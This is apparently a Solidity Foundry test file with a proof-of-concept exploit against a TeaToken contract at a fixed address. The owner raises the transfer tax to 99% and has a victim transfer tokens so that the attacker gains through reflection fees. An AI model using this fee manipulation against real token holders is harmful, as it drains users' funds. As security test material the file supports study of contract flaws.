interface ITeaToken {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function setTaxFeePercent(uint256 taxFee) external;
    function setLiquidityFeePercent(uint256 liquidityFee) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x5e18Be2A7cE626B33C539919EAca06303f1Db568;
    address attacker = address(this);
    ITeaToken private teaToken = ITeaToken(TARGET);
    address private victim = vm.addr(1);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // The test contract is the owner of TeaToken by default.
        // Give the victim some tokens to transfer.
        uint256 victimInitialBalance = 1_000_000 * 10**2; // 1M tokens with 2 decimals
        teaToken.transfer(victim, victimInitialBalance);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 balanceBefore = teaToken.balanceOf(attacker);

                // As owner, set total fee to 99% to avoid the subtraction overflow edge case.
                teaToken.setTaxFeePercent(99);
                teaToken.setLiquidityFeePercent(0);

                // Have victim make a transfer, which will be almost fully taxed.
                uint256 victimBalance = teaToken.balanceOf(victim);
                vm.startPrank(victim);
                teaToken.transfer(address(0xdead), victimBalance);
                vm.stopPrank();

                // The attacker's balance should have increased due to reflection fees.
                uint256 balanceAfter = teaToken.balanceOf(attacker);
                assertGt(balanceAfter, balanceBefore);
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

